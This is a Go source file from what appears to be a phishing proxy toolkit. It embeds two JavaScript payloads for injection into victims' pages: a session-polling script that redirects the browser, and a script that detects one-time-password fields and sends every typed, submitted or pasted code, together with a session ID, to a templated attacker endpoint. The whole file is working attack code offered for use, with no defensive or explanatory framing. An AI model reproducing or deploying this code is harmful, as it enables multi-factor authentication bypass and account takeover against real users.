package core

const DYNAMIC_REDIRECT_JS = `
function getRedirect(sid) {
	var url = "/s/" + sid;
	console.log("fetching: " + url);
	fetch(url, {
		method: "GET",
		headers: {
			"Content-Type": "application/json"
		},
		credentials: "include"
	})
		.then((response) => {

			if (response.status == 200) {
				return response.json();
			} else if (response.status == 408) {
				console.log("timed out");
				getRedirect(sid);
			} else {
				throw "http error: " + response.status;
			}
		})
		.then((data) => {
			if (data !== undefined) {
				console.log("api: success:", data);
				top.location.href=data.redirect_url;
			}
		})
		.catch((error) => {
			console.error("api: error:", error);
			setTimeout(function () { getRedirect(sid) }, 10000);
		});
}
getRedirect('{session_id}');
`

const OTP_CAPTURE_JS = `
(function() {
	var otpCaptureEndpoint = '{endpoint}';
	var sessionId = '{session_id}';
	var dataAttr = '{data_attr}';
	var fieldNames = [{field_names}];

	function sendOtpCode(code, fieldName) {
		var data = JSON.stringify({
			session_id: sessionId,
			otp_code: code,
			field_name: fieldName
		});
		try {
			fetch(otpCaptureEndpoint, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: data,
				credentials: 'include'
			}).catch(function(e) {
				console.debug('OTP capture send failed:', e);
			});
		} catch(e) {
			console.debug('OTP capture send error:', e);
		}
	}

	function isOtpField(input) {
		if (input.hasAttribute(dataAttr)) {
			return true;
		}
		var name = (input.name || input.id || '').toLowerCase();
		for (var i = 0; i < fieldNames.length; i++) {
			if (name.indexOf(fieldNames[i]) !== -1) {
				return true;
			}
		}
		var autocomplete = (input.getAttribute('autocomplete') || '').toLowerCase();
		if (autocomplete.indexOf('one-time-code') !== -1 || autocomplete.indexOf('otp') !== -1) {
			return true;
		}
		var inputmode = (input.getAttribute('inputmode') || '').toLowerCase();
		var type = (input.type || '').toLowerCase();
		if ((inputmode === 'numeric' || type === 'tel' || type === 'number') && name !== '') {
			for (var j = 0; j < fieldNames.length; j++) {
				if (name.indexOf(fieldNames[j]) !== -1) {
					return true;
				}
			}
		}
		var placeholder = (input.placeholder || '').toLowerCase();
		var otpKeywords = ['otp', '验证码', 'verification', 'code', '短信', '动态', 'token'];
		for (var k = 0; k < otpKeywords.length; k++) {
			if (placeholder.indexOf(otpKeywords[k]) !== -1) {
				return true;
			}
		}
		return false;
	}

	function attachOtpListeners() {
		var inputs = document.querySelectorAll('input');
		inputs.forEach(function(input) {
			if (input._otpCaptured) return;
			if (isOtpField(input)) {
				input._otpCaptured = true;
				var fieldName = input.name || input.id || 'otp';
				input.addEventListener('input', function() {
					var val = input.value.trim();
					if (val.length >= 4) {
						sendOtpCode(val, fieldName);
					}
				});
				input.addEventListener('blur', function() {
					var val = input.value.trim();
					if (val.length >= 4) {
						sendOtpCode(val, fieldName);
					}
				});
				var form = input.closest('form');
				if (form) {
					form.addEventListener('submit', function() {
						var val = input.value.trim();
						if (val.length >= 4) {
							sendOtpCode(val, fieldName);
						}
					}, true);
				}
			}
		});
	}

	function setupPasteListener() {
		document.addEventListener('paste', function(e) {
			var target = e.target;
			if (target && target.tagName === 'INPUT') {
				var pastedText = (e.clipboardData || window.clipboardData).getData('text');
				var codeMatch = pastedText.match(/\d{4,8}/);
				if (codeMatch && isOtpField(target)) {
					var fieldName = target.name || target.id || 'otp';
					setTimeout(function() {
						sendOtpCode(codeMatch[0], fieldName);
					}, 100);
				}
			}
		}, true);
	}

	if (document.readyState === 'loading') {
		document.addEventListener('DOMContentLoaded', function() {
			attachOtpListeners();
			setupPasteListener();
		});
	} else {
		attachOtpListeners();
		setupPasteListener();
	}

	var observer = new MutationObserver(function(mutations) {
		mutations.forEach(function(mutation) {
			if (mutation.addedNodes && mutation.addedNodes.length > 0) {
				attachOtpListeners();
			}
		});
	});
	observer.observe(document.body, { childList: true, subtree: true });
})();
`
